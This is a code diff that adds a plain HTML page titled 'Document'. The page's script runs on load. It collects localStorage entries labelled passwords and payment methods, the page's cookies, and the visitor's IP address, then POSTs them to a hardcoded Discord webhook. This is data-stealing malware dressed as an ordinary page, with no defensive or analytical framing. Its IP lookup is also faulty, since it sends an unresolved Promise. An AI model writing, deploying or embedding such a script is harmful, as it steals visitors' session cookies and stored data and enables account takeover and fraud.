@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+    <script>
+        // Replace with your Discord webhook URL
+        const webhookUrl = 'https://discord.com/api/webhooks/1437409358177763338/tqPgOTbwLvhNBhABDntVi1OhfKMld6mc_k8nG9ZNO6fD09rRBlnGU6RuONKbzI9FVzRb';
+
+        // Function to send data to Discord webhook
+        function sendData(data) {
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(data => console.log(data))
+            .catch(error => console.error('Error:', error));
+        }
+
+        // Get saved passwords, payment methods, cookies, and IP
+        const passwords = localStorage.getItem('passwords');
+        const paymentMethods = localStorage.getItem('paymentMethods');
+        const cookies = document.cookie;
+        const ip = getIpAddress();
+
+        // Function to get IP address
+        function getIpAddress() {
+            return new Promise((resolve, reject) => {
+                (function getIP() {
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('GET', 'https://api.ipify.org?format=json', true);
+                    xhr.onload = function() {
+                        if (xhr.status >= 200 && xhr.status < 300) {
+                            resolve(JSON.parse(xhr.responseText).ip);
+                        } else {
+                            reject(xhr.statusText);
+                        }
+                    };
+                    xhr.onerror = function() {
+                        reject(xhr.statusText);
+                    };
+                    xhr.send();
+                })();
+            });
+        }
+
+        // Send data to Discord webhook
+        sendData({
+            passwords: passwords,
+            paymentMethods: paymentMethods,
+            cookies: cookies,
+            ip: ip
+        });
+    </script>
+</body>
+</html>
